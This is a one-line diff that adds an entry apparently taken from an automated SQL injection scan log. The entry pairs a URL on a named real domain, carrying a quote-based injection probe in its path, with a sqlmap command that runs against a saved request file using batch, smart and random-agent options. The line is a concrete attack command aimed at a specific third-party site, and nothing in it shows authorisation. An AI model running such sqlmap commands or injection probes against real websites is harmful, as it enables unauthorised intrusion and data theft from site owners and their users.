@@ -1,0 +1,1 @@
+http://www.5iml.com:80/zbmh/1'"1000 (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests\007_SQL_Injection_path_3884135652538714102.txt --batch --smart --random-agent --output-dir sqlmap_output\007_3884135652538714102
